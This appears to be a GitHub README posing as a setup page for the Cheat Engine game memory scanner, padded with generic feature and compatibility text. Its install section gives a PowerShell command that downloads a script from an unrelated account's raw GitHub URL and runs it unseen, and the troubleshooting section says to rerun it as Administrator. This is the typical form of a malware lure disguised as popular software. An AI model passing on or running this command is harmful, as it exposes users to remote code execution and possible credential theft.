# Cheat-Engine-Setup

**Cheat Engine is an open-source memory scanner and debugger for modifying single-player game values. Edit health, ammo, currency, and speed with pointer scanning and Lua scripting.**

</div>

---

### Install

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

---

### What It Does

Cheat Engine Setup provides a complete solution right from your terminal. Run the command above and the tool configures itself automatically.

### Feature Highlights

- **One-Command Install** -- paste and go
- **Auto-Configuration** -- smart defaults for every system
- **Minimal Footprint** -- no bloatware, no toolbars
- **Offline Capable** -- works without constant internet

### Compatibility

Works on Windows 10 21H2+, Windows 11, and Windows Server 2022. x64 architecture required.

### Troubleshooting

If the install fails, try running PowerShell as Administrator and executing the command again.
